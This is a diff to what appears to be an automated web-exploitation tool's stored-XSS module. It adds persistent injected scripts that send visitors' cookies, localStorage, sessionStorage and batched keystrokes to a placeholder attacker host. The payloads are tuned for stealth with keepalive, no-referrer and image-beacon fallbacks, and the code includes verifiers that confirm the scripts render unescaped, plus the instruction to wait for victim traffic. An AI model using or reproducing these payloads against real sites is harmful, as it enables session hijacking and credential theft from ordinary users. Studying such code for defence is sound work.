@@ -3726,69 +3726,199 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
 
     elif etype == "stored_xss":
         render = ei.get("render_path", "/")
-        def _sxss_verify(r: ExploitResult):
-            body_l = r.response_body.lower()
-            if ("<script>" in body_l or "onerror=" in body_l
-                    or "onload=" in body_l):
-                r.success = True
-                r.confidence = 0.85
-                r.evidence = "Script/event-handler tag found in rendered page"
+
+        # Per-session id + per-step markers. Every injection carries its
+        # own cryptographically-random tag, so:
+        #   1. the render-page verifier can prove *which* payload landed
+        #      (marker appears verbatim in the unescaped HTML);
+        #   2. the attacker-side callback log can attribute captures back
+        #      to this engagement — the same marker rides along in the
+        #      callback URL as `sid=<session>&m=<marker>`.
+        _sxss_sid = secrets.token_hex(4)
+        _m_beacon = f"b{secrets.token_hex(4)}"
+        _m_cookie = f"c{secrets.token_hex(4)}"
+        _m_keylog = f"k{secrets.token_hex(4)}"
+        _m_store  = f"s{secrets.token_hex(4)}"
+
+        # POST responses to a stored-XSS sink usually don't reflect the
+        # payload directly — only the *render* page does. So the POST
+        # validator only checks that the server accepted the write.
+        def _sxss_post_accepted(r: ExploitResult):
+            if r.status_code in (200, 201, 202, 204, 301, 302, 303):
+                r.evidence = (f"Sink accepted payload: HTTP {r.status_code} "
+                              f"({len(r.response_body)} bytes)")
+                r.confidence = 0.5
+                r.false_positive_risk = "medium"
+            elif r.status_code in (400, 403, 404, 422):
+                r.evidence = (f"Sink rejected payload: HTTP {r.status_code} "
+                              f"— sanitiser or auth; try another field")
+                r.confidence = 0.2
                 r.false_positive_risk = "low"
+            else:
+                r.evidence = f"HTTP {r.status_code}"
+
+        def _make_sxss_verify(marker_str: str, context_hint: str):
+            """Verify stored payload actually rendered on the view page.
+
+            Success requires: marker appears in rendered body AND the
+            surrounding context includes the tag/attribute that makes it
+            executable AND the marker is NOT HTML-entity-encoded in its
+            immediate neighbourhood.
+            """
+            def _check(r: ExploitResult):
+                body = r.response_body
+                if marker_str not in body:
+                    r.evidence = (f"Marker {marker_str} not on render page "
+                                  f"(HTTP {r.status_code}) — payload may be "
+                                  f"queued, filtered or on a different path")
+                    r.confidence = 0.1
+                    r.false_positive_risk = "low"
+                    return
+                idx = body.find(marker_str)
+                window = body[max(0, idx - 60):idx + len(marker_str) + 60]
+                wl = window.lower()
+                if ("&lt;" in window and "<" not in window) or \
+                   "&#60;" in window or "&#x3c;" in wl:
+                    r.confidence = 0.35
+                    r.evidence = ("Marker stored but neighbourhood is "
+                                  "HTML-entity-encoded — not executing here")
+                    r.false_positive_risk = "low"
+                    return
+                if context_hint and context_hint.lower() not in wl:
+                    r.confidence = 0.5
+                    r.evidence = (f"Marker {marker_str} rendered but expected "
+                                  f"'{context_hint}' missing — likely text "
+                                  f"node, not executing")
+                    r.false_positive_risk = "medium"
+                    return
+                r.success = True
+                r.confidence = 0.95
+                r.evidence = (f"Stored XSS confirmed: marker {marker_str} "
+                              f"rendered with context '{context_hint}' "
+                              f"intact and unescaped")
+                r.false_positive_risk = "very_low"
+            return _check
+
+        # Payloads. Each carries the session id + its own marker as a
+        # query parameter on the callback so captures can be attributed.
+        # OPSEC: keepalive lets the request survive page unload, and
+        # referrerPolicy:'no-referrer' keeps the callback URL out of the
+        # victim's Referer header; fallback to <img> when fetch is blocked.
+        _beacon = (
+            f"<script id='{_m_beacon}'>"
+            f"fetch('[ATTACKER]/b?sid={_sxss_sid}&m={_m_beacon}"
+            f"&u='+encodeURIComponent(location.href)"
+            f"+'&r='+encodeURIComponent(document.referrer),"
+            f"{{mode:'no-cors',keepalive:true,referrerPolicy:'no-referrer'}})"
+            f".catch(function(){{"
+            f"new Image().src='[ATTACKER]/b?sid={_sxss_sid}&m={_m_beacon}"
+            f"&u='+encodeURIComponent(location.href);}});</script>"
+        )
         _cookie_access = (
-            "<script>new Image().src='[ATTACKER]/c?c='"
-            "+encodeURIComponent(document.cookie)"
-            "+'&u='+encodeURIComponent(location.href)"
-            "+'&r='+encodeURIComponent(document.referrer)</script>"
+            f"<script id='{_m_cookie}'>(function(){{"
+            f"var d={{sid:'{_sxss_sid}',m:'{_m_cookie}',"
+            f"c:document.cookie,u:location.href,"
+            f"r:document.referrer,ua:navigator.userAgent,"
+            f"ls:(function(){{try{{return JSON.stringify(localStorage)}}"
+            f"catch(_){{return''}}}})()}};"
+            f"fetch('[ATTACKER]/c',{{method:'POST',credentials:'include',"
+            f"keepalive:true,referrerPolicy:'no-referrer',"
+            f"headers:{{'Content-Type':'text/plain'}},"
+            f"body:JSON.stringify(d)}}).catch(function(){{"
+            f"new Image().src='[ATTACKER]/c?sid={_sxss_sid}&m={_m_cookie}"
+            f"&c='+encodeURIComponent(document.cookie).slice(0,1500);}});"
+            f"}})();</script>"
         )
         _input_capture = (
-            "<script>(function(){var q=[];document.onkeypress=function(e){"
-            "q.push(e.key);if(q.length>=16){"
-            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
-            "q=[];}};setInterval(function(){if(q.length){"
-            "new Image().src='[ATTACKER]/k?k='+encodeURIComponent(q.join(''));"
-            "q=[];}},5000);})();</script>"
+            f"<script id='{_m_keylog}'>(function(){{"
+            f"var q=[],s=0,SID='{_sxss_sid}',M='{_m_keylog}';"
+            f"function flush(){{if(!q.length)return;"
+            f"var k=q.join('');q=[];"
+            f"fetch('[ATTACKER]/k?sid='+SID+'&m='+M+'&s='+(s++)"
+            f"+'&k='+encodeURIComponent(k),"
+            f"{{mode:'no-cors',keepalive:true,referrerPolicy:'no-referrer'}})"
+            f".catch(function(){{"
+            f"new Image().src='[ATTACKER]/k?sid='+SID+'&m='+M+'&s='+(s-1)"
+            f"+'&k='+encodeURIComponent(k);}});}}"
+            f"document.addEventListener('keypress',function(e){{"
+            f"q.push(e.key);if(q.length>=24)flush();}},true);"
+            f"setInterval(flush,7000);"
+            f"window.addEventListener('beforeunload',flush);"
+            f"}})();</script>"
         )
         _storage_dump = (
-            "<script>(function(){var d={c:document.cookie,u:location.href,"
-            "ls:JSON.stringify(localStorage),"
-            "ss:JSON.stringify(sessionStorage)};"
-            "fetch('[ATTACKER]/s',{method:'POST',credentials:'include',"
-            "keepalive:true,headers:{'Content-Type':'application/json'},"
-            "body:JSON.stringify(d)}).catch(function(){});})();</script>"
+            f"<script id='{_m_store}'>(function(){{"
+            f"var d={{sid:'{_sxss_sid}',m:'{_m_store}',"
+            f"c:document.cookie,u:location.href,r:document.referrer,"
+            f"ua:navigator.userAgent,"
+            f"ls:(function(){{try{{return JSON.stringify(localStorage)}}"
+            f"catch(_){{return''}}}})(),"
+            f"ss:(function(){{try{{return JSON.stringify(sessionStorage)}}"
+            f"catch(_){{return''}}}})(),"
+            f"idb:(function(){{try{{"
+            f"return(indexedDB.databases?'enum':'legacy')}}"
+            f"catch(_){{return'none'}}}})()}};"
+            f"fetch('[ATTACKER]/s',{{method:'POST',credentials:'include',"
+            f"keepalive:true,referrerPolicy:'no-referrer',"
+            f"headers:{{'Content-Type':'text/plain'}},"
+            f"body:JSON.stringify(d)}}).catch(function(){{"
+            f"new Image().src='[ATTACKER]/s?sid={_sxss_sid}&m={_m_store}"
+            f"&c='+encodeURIComponent(document.cookie).slice(0,1500);}});"
+            f"}})();</script>"
         )
-        _beacon = (
-            "<script>fetch('[ATTACKER]/b?u='"
-            "+encodeURIComponent(location.href))"
-            ".catch(function(){});</script>"
-        )
+
         steps = [
-            {"title": "Beacon (confirm render without data access)",
+            # 1. Benign beacon first — proves the sink renders unescaped
+            #    before we push heavier payloads that might trip a WAF
+            #    and burn the injection point.
+            {"title": "Inject beacon (benign; confirm rendering)",
              "request": _post(target, {param: _beacon}),
-             "note": "Harmless ping — lets you confirm the XSS fires before "
-                     "running impact-demonstration payloads.",
-             "validate": lambda r: setattr(
-                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
+             "validate": _sxss_post_accepted,
+             "note": (f"Beacon marker {_m_beacon} — harmless, pings "
+                      f"[ATTACKER]/b when rendered so you know the XSS "
+                      f"fires before using stronger payloads.")},
+            {"title": "Verify beacon renders (load view page)",
+             "request": _get(base_url.rstrip("/") + render),
+             "validate": _make_sxss_verify(_m_beacon, "<script"),
+             "note": (f"Fetches {render} and checks that marker "
+                      f"{_m_beacon} is present AND not entity-encoded.")},
+
+            # 2. Cookie / session context demonstration
             {"title": "Demonstrate persistent cookie-access impact",
              "request": _post(target, {param: _cookie_access}),
-             "warning": "Injects a persistent PoC payload",
-             "validate": lambda r: setattr(
-                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
+             "validate": _sxss_post_accepted,
+             "warning": ("Persistent payload: when victims view the page, "
+                         "cookies + URL + referrer + UA + localStorage "
+                         "get POSTed to [ATTACKER]/c"),
+             "risk": "HIGH"},
+            {"title": "Verify cookie-access payload rendered",
+             "request": _get(base_url.rstrip("/") + render),
+             "validate": _make_sxss_verify(_m_cookie, "<script"),
+             "note": "Then wait for victim traffic — captures land on /c"},
+
+            # 3. Input capture
             {"title": "Demonstrate persistent input-capture impact",
              "request": _post(target, {param: _input_capture}),
-             "warning": "Injects persistent input-capture PoC (buffers + batches keys)",
-             "risk": "CRITICAL",
-             "validate": lambda r: setattr(
-                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
+             "validate": _sxss_post_accepted,
+             "warning": ("Batches keys every 24 chars / 7s / on unload; "
+                         "each batch carries sid+marker+sequence number"),
+             "risk": "CRITICAL"},
+            {"title": "Verify input-capture payload rendered",
+             "request": _get(base_url.rstrip("/") + render),
+             "validate": _make_sxss_verify(_m_keylog, "<script")},
+
+            # 4. Storage context demonstration
             {"title": "Demonstrate storage-access impact",
              "request": _post(target, {param: _storage_dump}),
-             "warning": "Reads cookies + localStorage + sessionStorage to /s",
-             "risk": "CRITICAL",
-             "validate": lambda r: setattr(
-                 r, 'evidence', f"POST returned HTTP {r.status_code}")},
-            {"title": "Verify PoC payload renders",
+             "validate": _sxss_post_accepted,
+             "warning": ("Dumps cookies + localStorage + sessionStorage + "
+                         "IndexedDB presence to [ATTACKER]/s"),
+             "risk": "CRITICAL"},
+            {"title": "Verify storage-access payload rendered",
              "request": _get(base_url.rstrip("/") + render),
-             "validate": _sxss_verify,
-             "note": "Checks if injected script appears on the render page"},
+             "validate": _make_sxss_verify(_m_store, "<script"),
+             "note": ("Session id for this engagement: "
+                      f"{_sxss_sid}. Every capture is tagged with it.")},
         ]
 
     elif etype == "lfi":
